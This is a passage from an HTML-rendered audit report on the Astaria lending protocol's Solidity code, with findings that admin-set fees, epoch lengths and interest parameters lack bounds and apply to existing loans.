class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The relevant parameter s.minInterestBPS and s.minDurationIncrease can be adjusted in the function file with no boundary setting.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinInterestBPS</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinDurationIncrease</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span></span></span></code></pre>\n<p>The impact is that if the The loan duration increases duration is too long and the interest decreases too much, this may favor the lender too much and not fair to borrower. The payment to lender can be infinitely delayed.</p>\n<p>If the loan duration increase duration is too short and the interest decrease is too small, the refinance become pointless.</p>\n<p>If the admin change the protocol fee, buyout fee or the epoch length or the max interest rate with no reasonable boundary by calling <code>Astaria#file</code>, the impact is severe.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProtocolFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">BuyoutFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>and</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinDurationIncrease</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxInterestRate</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxInterestRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span></span></span></code></pre>\n<p>The admin can charge high liqudation fee and there may not be enough fund left to pay out the outstanding debt.</p>\n<p>The admin can charge high buyout fee, which impact the lien token buyout.</p>\n<p>If the max interest rate is high, the interest can become unreasonable for a vault and not fair for lender to pay out the accuring debt.</p>\n<p>If the epoch lengh is too long, the gap between withdraw is too long and the user cannot withdraw their fund on time.</p>\n<h3 id=\"recommended-mitigation-steps-51\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-51\" aria-label=\"recommended mitigation steps 51 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol add reasonable boundary to fee setting and liqudation length setting.</p>\n<h2 id=\"02-new-protocol-parameter-setting-should-not-be-applied-to-old-loan-term-and-state-especially-the-fee-setting\" style=\"position:relative;\"><a href=\"#02-new-protocol-parameter-setting-should-not-be-applied-to-old-loan-term-and-state-especially-the-fee-setting\" aria-label=\"02 new protocol parameter setting should not be applied to old loan term and state especially the fee setting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/76\">[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting</a></h2>\n<p>The admin has a lot of power. One of the power in admin’s hand is that the admin can call function file in AstariaRouter.sol to change the parameter change.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AuctionWindow</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">window</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">window</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LiquidationFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProtocolFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">BuyoutFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span 